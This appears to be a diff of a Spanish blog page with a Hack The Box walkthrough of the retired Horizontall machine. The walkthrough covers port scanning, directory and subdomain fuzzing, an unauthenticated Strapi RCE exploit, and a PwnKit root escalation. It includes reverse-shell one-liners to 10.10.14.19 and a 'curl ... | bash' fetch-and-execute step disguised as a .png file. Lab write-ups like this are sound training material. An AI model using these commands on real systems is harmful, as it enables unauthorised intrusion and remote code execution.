@@ -3,7 +3,7 @@
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='En este post voy a explicar paso por paso como hacer la máquina horizontall de Hack The Box desde 0, es una máquina nivel Fácil, tiene Linux y ya está retirada
 Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-ping -c 1 10.10.11.105 En este caso da un ttl de 63
+1 ping -c 1 10.10.11.105 En este caso da un ttl de 63
 Entendiendo que ttl=64: Linux / ttl=128: Windows
 Esta máquina es Linux por aproximación'>
 <title>Resolución Máquina Horizontall</title>
@@ -13,7 +13,7 @@ Esta máquina es Linux por aproximación'>
 <link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Resolución Máquina Horizontall'>
 <meta property='og:description' content='En este post voy a explicar paso por paso como hacer la máquina horizontall de Hack The Box desde 0, es una máquina nivel Fácil, tiene Linux y ya está retirada
 Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-ping -c 1 10.10.11.105 En este caso da un ttl de 63
+1 ping -c 1 10.10.11.105 En este caso da un ttl de 63
 Entendiendo que ttl=64: Linux / ttl=128: Windows
 Esta máquina es Linux por aproximación'>
 <meta property='og:url' content='https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/'>
@@ -22,7 +22,7 @@ Esta máquina es Linux por aproximación'>
 <meta name="twitter:title" content="Resolución Máquina Horizontall">
 <meta name="twitter:description" content="En este post voy a explicar paso por paso como hacer la máquina horizontall de Hack The Box desde 0, es una máquina nivel Fácil, tiene Linux y ya está retirada
 Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-ping -c 1 10.10.11.105 En este caso da un ttl de 63
+1 ping -c 1 10.10.11.105 En este caso da un ttl de 63
 Entendiendo que ttl=64: Linux / ttl=128: Windows
 Esta máquina es Linux por aproximación"><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://d3b0o.github.io/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/100.png' />
@@ -366,6 +366,20 @@ if (!doNotTrack) {
         
 
         
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    6 minutos a leer
+                </time>
+            </div>
+        
     </footer>
     
 
@@ -381,9 +395,15 @@ if (!doNotTrack) {
 <hr>
 <h2 id="reconocimiento">Reconocimiento</h2>
 <p><strong>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</strong></p>
-<pre><code class="language-bash">ping -c 1 10.10.11.105
-</code></pre>
-<p>En este caso da un ttl de <strong>63</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ping -c <span class="m">1</span> 10.10.11.105
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>En este caso da un ttl de <strong>63</strong></p>
 <p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/ping.png"
 	width="607"
 	height="150"
@@ -400,9 +420,15 @@ if (!doNotTrack) {
 <p>Esta máquina es <strong>Linux</strong> por aproximación</p>
 <h3 id="escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</h3>
 <p>Ahora empezamos con un escaneo de puertos</p>
-<pre><code class="language-bash">nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.11.105 -oG allPorts
-</code></pre>
-<div class="table-wrapper"><table>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- --open -sS --min-rate <span class="m">5000</span> -n -vvv -Pn 10.10.11.105 -oG allPorts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
 <thead>
 <tr>
 <th>Parámetro</th>
@@ -457,9 +483,15 @@ if (!doNotTrack) {
 	
 ></p>
 <p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
-<pre><code class="language-bash">nmap -p22,80 -sC -sV 10.10.11.105 -oN target
-</code></pre>
-<div class="table-wrapper"><table>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p22,80 -sC -sV 10.10.11.105 -oN target
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
 <thead>
 <tr>
 <th>Parámetro</th>
@@ -530,9 +562,15 @@ if (!doNotTrack) {
 ></p>
 <h3 id="buscar-subdirectorios-wfuzz">Buscar subdirectorios (wfuzz)</h3>
 <p>Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que está en <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code> con el siguiente comando:</p>
-<pre><code class="language-bash">wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
-</code></pre>
-<div class="table-wrapper"><table>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wfuzz -c -t <span class="m">200</span> --hc<span class="o">=</span><span class="m">404</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://horizontall.htb/FUZZ
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
 <thead>
 <tr>
 <th>Parámetro</th>
@@ -581,9 +619,15 @@ if (!doNotTrack) {
 </ul>
 <h3 id="buscar-subdominios-gobuster">Buscar subdominios (gobuster)</h3>
 <p>Con gobuster podemos buscar subdominios con el siguiente comando</p>
-<pre><code class="language-bash">gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u horizontall.htb
-</code></pre>
-<p>Encontramos un subdominio llamado api-prod.horizontall.htb, otra forma de haberlo encontrado sin el gobuster es dandole a inspeccionar y después entrando al Depurador y ahí se puede ver que hay 2 js</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gobuster vhost -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t <span class="m">50</span> -u horizontall.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Encontramos un subdominio llamado api-prod.horizontall.htb, otra forma de haberlo encontrado sin el gobuster es dandole a inspeccionar y después entrando al Depurador y ahí se puede ver que hay 2 js</p>
 <p><img src="/p/resoluci%C3%B3n-m%C3%A1quina-horizontall/images/inspecionar.png"
 	width="311"
 	height="205"
@@ -641,9 +685,15 @@ if (!doNotTrack) {
 ></p>
 <h3 id="buscar-subdirectorios-wfuzz-1">Buscar subdirectorios (wfuzz)</h3>
 <p>Para encontrar subdirectorios vamos a usar la misma herramienta que antes, wfuzz</p>
-<pre><code class="language-bash">wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/FUZZ
-</code></pre>
-<div class="table-wrapper"><table>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wfuzz -c -t <span class="m">200</span> --hc<span class="o">=</span><span class="m">404</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/FUZZ
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
 <thead>
 <tr>
 <th>Parámetro</th>
@@ -693,13 +743,23 @@ if (!doNotTrack) {
 </ul>
 <h3 id="contenido-subdirectorios">Contenido subdirectorios</h3>
 <p>Probamos a entrar en reviews y vemos lo siguiente:</p>
-<pre><code class="language-bash">[{&quot;id&quot;:1,&quot;name&quot;:&quot;wail&quot;,&quot;description&quot;:&quot;This is good service&quot;,&quot;stars&quot;:4,&quot;created_at&quot;:&quot;2021-05-29T13:23:38.000Z&quot;,&quot;updated_at&quot;:&quot;2021-05-29T13:23:38.000Z&quot;},
-{&quot;id&quot;:2,&quot;name&quot;:&quot;doe&quot;,&quot;description&quot;:&quot;i'm satisfied with the product&quot;,&quot;stars&quot;:5,&quot;created_at&quot;:&quot;2021-05-29T13:24:17.000Z&quot;,&quot;updated_at&quot;:&quot;2021-05-29T13:24:17.000Z&quot;},
-{&quot;id&quot;:3,&quot;name&quot;:&quot;john&quot;,&quot;description&quot;:&quot;create service with minimum price i hop i can buy more in the futur&quot;,&quot;stars&quot;:5,&quot;created_at&quot;:&quot;2021-05-29T13:25:26.000Z&quot;,
-  
-&quot;updated_at&quot;:&quot;2021-05-29T13:25:26.000Z&quot;}]
-</code></pre>
-<p>Ya sabemos 3 usuarios:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[{</span><span class="s2">&#34;id&#34;</span>:1,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;wail&#34;</span>,<span class="s2">&#34;description&#34;</span>:<span class="s2">&#34;This is good service&#34;</span>,<span class="s2">&#34;stars&#34;</span>:4,<span class="s2">&#34;created_at&#34;</span>:<span class="s2">&#34;2021-05-29T13:23:38.000Z&#34;</span>,<span class="s2">&#34;updated_at&#34;</span>:<span class="s2">&#34;2021-05-29T13:23:38.000Z&#34;</span><span class="o">}</span>,
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;id&#34;</span>:2,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;doe&#34;</span>,<span class="s2">&#34;description&#34;</span>:<span class="s2">&#34;i&#39;m satisfied with the product&#34;</span>,<span class="s2">&#34;stars&#34;</span>:5,<span class="s2">&#34;created_at&#34;</span>:<span class="s2">&#34;2021-05-29T13:24:17.000Z&#34;</span>,<span class="s2">&#34;updated_at&#34;</span>:<span class="s2">&#34;2021-05-29T13:24:17.000Z&#34;</span><span class="o">}</span>,
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;id&#34;</span>:3,<span class="s2">&#34;name&#34;</span>:<span class="s2">&#34;john&#34;</span>,<span class="s2">&#34;description&#34;</span>:<span class="s2">&#34;create service with minimum price i hop i can buy more in the futur&#34;</span>,<span class="s2">&#34;stars&#34;</span>:5,<span class="s2">&#34;created_at&#34;</span>:<span class="s2">&#34;2021-05-29T13:25:26.000Z&#34;</span>,
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;updated_at&#34;</span>:<span class="s2">&#34;2021-05-29T13:25:26.000Z&#34;</span><span class="o">}]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ya sabemos 3 usuarios:</p>
 <ul>
 <li>wail</li>
 <li>doe</li>
@@ -721,9 +781,15 @@ if (!doNotTrack) {
 <p>Haciendo una búsqueda por google podemos encontrar las credenciales default de strapi, admin:admin, pero no funcionan.</p>
 <h3 id="buscar-subdirectorios-sobre-admin-wfuzz">Buscar subdirectorios sobre /admin/ (wfuzz)</h3>
 <p>Para ver si hay más subdirectorios en /admin/ volvemos a usar wfuzz pero ahora sobre el directorio admin</p>
-<pre><code class="language-bash">wfuzz -c -t 200 --hc=404 --hh=854 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/admin/FUZZ
-</code></pre>
-<div class="table-wrapper"><table>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wfuzz -c -t <span class="m">200</span> --hc<span class="o">=</span><span class="m">404</span> --hh<span class="o">=</span><span class="m">854</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/admin/FUZZ
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
 <thead>
 <tr>
 <th>Parámetros</th>
@@ -765,61 +831,134 @@ if (!doNotTrack) {
 <li>init</li>
 </ul>
 <p>Al entrar a init vemos lo siguiente</p>
-<pre><code class="language-bash">{&quot;data&quot;:
-{&quot;uuid&quot;:&quot;a55da3bd-9693-4a08-9279-f9df57fd1817&quot;,
-&quot;currentEnvironment&quot;:&quot;development&quot;,
-&quot;autoReload&quot;:false,
-&quot;strapiVersion&quot;:&quot;3.0.0-beta.17.4&quot;}}
-</code></pre>
-<h3 id="buscar-posible-vulnerabilidad-searchsploit">Buscar posible vulnerabilidad (searchsploit)</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;data&#34;</span>:
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;uuid&#34;</span>:<span class="s2">&#34;a55da3bd-9693-4a08-9279-f9df57fd1817&#34;</span>,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;currentEnvironment&#34;</span>:<span class="s2">&#34;development&#34;</span>,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;autoReload&#34;</span>:false,
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;strapiVersion&#34;</span>:<span class="s2">&#34;3.0.0-beta.17.4&#34;</span><span class="o">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="buscar-posible-vulnerabilidad-searchsploit">Buscar posible vulnerabilidad (searchsploit)</h3>
 <p>Ahora tenemos la versión de strapi y con el comando searchsploit se puede buscar si es vulnerable: <code>searchsploit strapi 3.0.0-beta.17.4</code></p>
 <p>Nos muestra los siguientes exploits</p>
-<pre><code class="language-bash">❯ searchsploit strapi 3.0.0-beta.17.4
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Exploit Title                                                                                                                                             |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                                 | multiple/webapps/50239.py
-Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                                   | nodejs/webapps/50716.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
-Shellcodes: No Results
-</code></pre>
-<hr>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ searchsploit strapi 3.0.0-beta.17.4
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Exploit Title                                                                                                                                             <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution <span class="o">(</span>RCE<span class="o">)</span> <span class="o">(</span>Unauthenticated<span class="o">)</span>                                                                                 <span class="p">|</span> multiple/webapps/50239.py
+</span></span><span class="line"><span class="cl">Strapi CMS 3.0.0-beta.17.4 - Set Password <span class="o">(</span>Unauthenticated<span class="o">)</span> <span class="o">(</span>Metasploit<span class="o">)</span>                                                                                   <span class="p">|</span> nodejs/webapps/50716.rb
+</span></span><span class="line"><span class="cl">----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+</span></span><span class="line"><span class="cl">Shellcodes: No Results
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
 <h2 id="explotación-de-vulnerabilidades">Explotación de Vulnerabilidades</h2>
 <p>Ahora ya sabemos una vulnerabilidad (strapi), strapi es un CMS de código abierto basado en Node.js que te permite crear una API y gestionar su contenido</p>
 <p>De los 2 exploits que reporto el serachsploit vamos a usar el que está hecho con python, lo pasamos al directorio actual y después lo ejecutamos</p>
-<pre><code class="language-bash">searchsploit -m 50239.py
-</code></pre>
-<h3 id="ejecutar-exploit">Ejecutar Exploit</h3>
-<pre><code class="language-python">python3 50239.py http://api-prod.horizontall.htb
-</code></pre>
-<p>Eso nos va a abrir una inyección de comandos en la cual no podemos ver la respuesta.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit -m 50239.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="ejecutar-exploit">Ejecutar Exploit</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python3</span> <span class="mf">50239.</span><span class="n">py</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">api</span><span class="o">-</span><span class="n">prod</span><span class="o">.</span><span class="n">horizontall</span><span class="o">.</span><span class="n">htb</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Eso nos va a abrir una inyección de comandos en la cual no podemos ver la respuesta.</p>
 <h3 id="reverse-shell">Reverse shell</h3>
 <ol>
 <li>
 <p>Primero nos ponemos en escucha por el puerto 443 con netcat</p>
-<pre><code class="language-bash">nc -nlvp 443
-</code></pre>
-</li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nlvp <span class="m">443</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 <li>
 <p>Probamos a crear la reverse shell</p>
-<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/10.10.14.19/443 0&gt;&amp;1
-</code></pre>
-<p>No recibimos nada, Probamos añadiendo el bash -c</p>
-<pre><code class="language-bash">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.19/443 0&gt;&amp;1&quot;
-</code></pre>
-<p>Tampoco la pilla, vamos a probar de crear un archivo .png con el comando de bash para la reverse shell, después con un curl lo vamos a mandar a la máquina a través de un servidor creado con python para que después lo ejecute con bash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.19/443 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>No recibimos nada, Probamos añadiendo el bash -c</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.19/443 0&gt;&amp;1&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Tampoco la pilla, vamos a probar de crear un archivo .png con el comando de bash para la reverse shell, después con un curl lo vamos a mandar a la máquina a través de un servidor creado con python para que después lo ejecute con bash</p>
 <p>Contenido de photo.png</p>
-<pre><code class="language-bash">#!/bin/bash
-
-bash -i &gt;&amp; /dev/tcp/10.10.14.19/443 0&gt;&amp;1
-</code></pre>
-<p>Abrimos un servidor con python por el puerto 80</p>
-<pre><code class="language-python">python3 -m http.server 80
-</code></pre>
-<p>Por último, en la inyección de comandos que nos dio el exploit, hacemos un curl</p>
-<pre><code>curl http://10.10.14.19/photo.png | bash
-</code></pre>
-</li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/10.10.14.19/443 0&gt;<span class="p">&amp;</span><span class="m">1</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Abrimos un servidor con python por el puerto 80</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Por último, en la inyección de comandos que nos dio el exploit, hacemos un curl</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">curl http://10.10.14.19/photo.png | bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ol>
 <p>con un <code>ifconfig</code> confirmamos que estamos en la 10.10.11.105</p>
 <p>¡Ya tenemos una reverse shell!</p>
@@ -827,48 +966,122 @@ bash -i &gt;&amp; /dev/tcp/10.10.14.19/443 0&gt;&amp;1
 <h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
 <h3 id="tratamiento-de-la-tty">Tratamiento de la tty</h3>
 <p>Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:</p>
-<pre><code class="language-bash">script /dev/null -c bash
-</code></pre>
-<p>ctrl + z</p>
-<pre><code class="language-bash">stty raw -echo; fg
-</code></pre>
-<pre><code class="language-bash">reset
-</code></pre>
-<pre><code class="language-bash">xterm
-</code></pre>
-<pre><code class="language-bash">export SHELL=bash
-</code></pre>
-<pre><code class="language-bash">export TERM=xterm
-</code></pre>
-<h3 id="flag-usuario">Flag Usuario</h3>
-<pre><code class="language-bash">cat /home/developer/user.txt
-</code></pre>
-<h3 id="flag-root">Flag Root</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">script /dev/null -c bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ctrl + z</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reset
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xterm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">SHELL</span><span class="o">=</span>bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="flag-usuario">Flag Usuario</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /home/developer/user.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="flag-root">Flag Root</h3>
 <p>Después de buscar un rato, he encontrado que es vulnerable a <a class="link" href="https://github.com/berdav/CVE-2021-4034"  target="_blank" rel="noopener"
     >https://github.com/berdav/CVE-2021-4034</a></p>
 <p>Los pasos para ejecutarlo son:</p>
 <p>Clonar el repositorio de github en nuestra máquina</p>
-<pre><code class="language-bash">git clone https://github.com/berdav/CVE-2021-4034
-</code></pre>
-<p>Lo comprimimos</p>
-<pre><code>zip -r CVE-2021-4034
-</code></pre>
-<p>Desde la máquina víctima y usando el mismo servidor con python de antes lo pasamos con wget</p>
-<pre><code class="language-bash">wget http://10.10.14.19:80/CVE-2021-4034.zip
-
-unzip CVE-2021-4034.zip
-
-cd CVE-2021-4034
-
-make
-
-./cve-2021-4034
-</code></pre>
-<p>Si hacemos un whoami ya somos root!!!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/berdav/CVE-2021-4034
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Lo comprimimos</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">zip -r CVE-2021-4034
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Desde la máquina víctima y usando el mismo servidor con python de antes lo pasamos con wget</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://10.10.14.19:80/CVE-2021-4034.zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">unzip CVE-2021-4034.zip
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> CVE-2021-4034
+</span></span><span class="line"><span class="cl">
